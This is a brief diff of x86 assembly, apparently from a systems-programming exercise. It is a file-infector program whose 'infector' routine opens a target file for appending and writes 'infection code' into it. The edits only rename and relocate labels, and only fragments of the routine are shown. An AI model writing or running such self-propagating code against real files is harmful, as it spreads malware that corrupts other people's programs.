@@ -18,7 +18,6 @@ global _start
 global system_call
 global infector
 extern main
-extern strlen
 
 _start:
     pop    dword ecx    ; ecx = argc
@@ -78,6 +77,7 @@ infector:
     mov ecx, O_WRONLY | O_APPEND
     mov edx, 0
     int 0x80
+check_point:
     mov [ebp-4], eax
 
     ; Write the infection code to the file
@@ -95,4 +95,5 @@ infector:
     add esp, 4
     pop ebp
     ret
+
 code_end:
